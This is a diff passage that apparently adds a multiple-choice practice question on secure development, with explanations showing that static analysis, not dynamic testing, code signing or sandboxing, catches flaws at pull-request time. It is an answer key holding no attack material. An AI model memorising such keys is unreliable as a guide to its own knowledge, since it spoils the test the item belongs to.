+        why: Static analysis inspects source code without executing it, so it can run on every pull request and flag dangerous patterns and embedded credentials before a build exists.
+    B. Dynamic application testing against the staging environment
+        why: Dynamic testing requires a running application, so it happens after build and deployment rather than at pull request time.
+    C. Code signing of the release artifacts
+        why: Signing proves who produced a build and that it was not altered; it does not find vulnerabilities in the code.
+    D. Sandboxing the application at runtime
+        why: A sandbox limits damage from a running application; it does not inspect source code for flaws.
+TAKEAWAY: Static analysis = source code, pre-build, shift-left. Dynamic analysis = running app. Code signing = integrity and origin. Sandboxing = runtime containment.
